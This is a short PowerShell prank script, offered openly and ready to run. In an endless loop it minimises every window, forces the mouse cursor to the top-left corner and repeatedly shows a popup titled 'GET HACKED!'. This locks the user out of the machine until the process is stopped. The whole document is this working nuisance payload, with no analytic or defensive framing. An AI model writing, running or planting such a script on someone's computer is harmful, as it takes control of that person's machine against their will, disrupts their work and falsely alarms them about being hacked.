#One script to rule them all!
Add-Type -AssemblyName System.Windows.Forms;$shell = New-Object -ComObject "Shell.Application";$wshell = New-Object -ComObject Wscript.Shell;while(1){$shell.minimizeall();[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0);$wshell.Popup("eZZZZZZZZZZZ",1,"GET HACKED!");}
